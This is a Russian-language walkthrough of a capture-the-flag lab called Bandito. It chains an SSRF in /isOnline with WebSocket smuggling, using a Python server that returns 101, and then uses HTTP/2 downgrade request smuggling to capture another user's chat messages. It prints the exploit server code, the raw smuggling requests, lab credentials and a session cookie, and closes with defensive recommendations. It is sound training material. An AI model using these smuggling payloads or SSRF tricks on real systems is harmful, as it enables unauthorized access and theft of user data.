# Отчет по прохождению Bandito — WebSocket smuggling + HTTP/2 downgrade

**1. Разведка (Reconnaissance)**  
Сканирование Nmap выявило открытые порты: 22/tcp (SSH OpenSSH 8.2p1), 80/tcp (El Bandito Server, SSL, заголовок "nothing to see" с messages.js), 631/tcp (CUPS 2.4), 8080/tcp (nginx, Spring Java Framework). На порту 8080 обнаружен файл /services.html, содержащий ссылки на виртуальные хосты: http://bandito.websocket.thm (OFFLINE) и http://bandito.public.thm (ONLINE). Оба хоста добавлены в /etc/hosts.

**2. Фаззинг директорий и эндпоинтов**  
Проведен фаззинг bandito.thm:8080. Найдены эндпоинты: /info (200, пустой JSON), /token (200, меняющееся число), /metrics (403), /admin-flag (403), /admin-creds (403), /error (500), и множество других с 403 (traceroute, trace, environment, administration, envelope_small, envelope, administrator, envolution, env, dump, tracert, administr8, environmental, administrative, tracer, administratie, admins, admin_images, envelopes, administrativia, beans). Фаззинг bandito.public.thm:8080 и bandito.websocket.thm:8080 дал аналогичные результаты.

**3. Обнаружение SSRF через /isOnline**  
На странице /services.html заинтересовал запрос GET /isOnline?url=http://bandito.websocket.thm. Проверка показала, что сервер делает запрос по переданному URL. Отправлен запрос на свой IP: GET /isOnline? запрос. На слушателе получен входящий GET-запрос: "GET / HTTP/1.1" 200. SSRF подтвержден.

**4. WebSocket smuggling через SSRF**  
Цель: обойти ограничения прокси и получить доступ к защищенным эндпоинтам (/metrics, /admin-flag, /admin-creds). На атакующей машине запущен сервер, возвращающий 101 Switching Protocols:

from http.server import BaseHTTPRequestHandler, HTTPServer
class ExploitHandler(BaseHTTPRequestHandler):
def do_GET(self):
self.send_response(101)
self.end_headers()
HTTPServer(('0.0.0.0', 5555), ExploitHandler).serve_forever()

# Сформирован запрос с WebSocket-заголовками и вторым запросом внутри:

GET /isOnline?url=http://attack_ip:attack_port HTTP/1.1
Host: bandito.public.thm:8080
Sec-WebSocket-Version: 77
Upgrade: WebSocket
Connection: Upgrade
Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==

GET /token HTTP/1.1
Host: bandito.public.thm:8080

Получен ответ с 101 и 200 OK. WebSocket smuggling успешно реализован.

**5. Получение защищенных данных через WebSocket smuggling**  
Через отравленное соединение выполнен запрос к /metrics, получены метрики с gauge.response.admin-creds и gauge.response.admin-flag. Затем выполнен запрос к /admin-flag — получен флаг. Запрос к /admin-creds вернул учетные данные: username: hAckLIEN, password: YouCanCatchUsInYourDreams404. Попытка использования для SSH не удалась (сервер принимает только ключи).

**6. Анализ порта 80 (El Bandito Server)**  
На порту 80 обнаружен кастомный Python-сервер. По пути /static/messages.js найден код чата с эндпоинтами /getMessages и /send_message. По адресу https://bandito.websocket.thm:80/getMessages форма логина. Учетные данные hAckLIEN / YouCanCatchUsInYourDreams404 подошли.

**7. XSS в чате — не сработал**  
При отправке сообщений теги экранируются. В коде messages.js обнаружена возможность отправки сообщения от имени бота через параметр ?msg=, но эксплуатация не дала результата.

**8. HTTP/2 downgrade smuggling**  
Цель: перехватить сообщения чата и получить флаг. Сформирован запрос с HTTP/2 и Content-Length: 0, чтобы сервер интерпретировал это как конец запроса. Второй запрос внутри — на /send_message с большим Content-Length для захвата данных следующего пользователя.

POST / HTTP/2
Host: bandito.websocket.thm:80
Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.ac88dg.hnRYi_b1n8RPCoVyl--eWCjGwLE
Content-Length: 0

POST /send_message HTTP/1.1
Host: bandito.websocket.thm:80
Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.ac88dg.hnRYi_b1n8RPCoVyl--eWCjGwLE
Content-Length: 900

data=

- HTTP/2 не ориентируется на Content-Length, он игнорируется, а бэкенд (HTTP/1.1) принимает второй запрос как отдельный.

**9. Получение флага**  
После отправки smuggling-запроса выполнен запрос на /getMessages. В ответе обнаружено сообщение от бота с флагом.

**10. Достижения и новые навыки**  
Впервые применен WebSocket smuggling через SSRF с подставным сервером, возвращающим 101. Впервые использован HTTP/2 downgrade smuggling для перехвата сообщений чата. Комбинированы техники: SSRF → WebSocket smuggling → HTTP/2 downgrade → кража данных.

**11. Рекомендации**  
Ограничить исходящие запросы с сервера (белый список доменов). Запретить возврат 101 от внешних серверов при WebSocket upgrade. Использовать HTTP/2 на всех уровнях, избегать downgrade. Установить флаг HttpOnly и SameSite=Strict для сессионных cookie. Экранировать пользовательский ввод в чате.
